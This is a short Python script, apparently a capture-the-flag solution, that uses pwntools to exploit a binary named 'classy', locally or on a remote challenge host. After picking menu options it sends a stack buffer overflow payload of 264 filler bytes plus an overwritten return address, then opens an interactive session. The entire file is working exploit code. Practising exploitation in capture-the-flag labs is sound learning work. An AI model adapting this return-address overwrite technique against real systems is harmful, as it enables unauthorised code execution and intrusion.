#!/usr/bin/python3

from pwn import *

exe = ELF('classy', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x4028ff

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('rumble.host', 9797)
else:
        p = process(exe.path)

GDB()
sla(b"level?", b"1")
sla(b"level", b"3")

payload = b"a"*264 + p64(0x0000000000406a98)
sla(b"me", payload)
p.interactive()
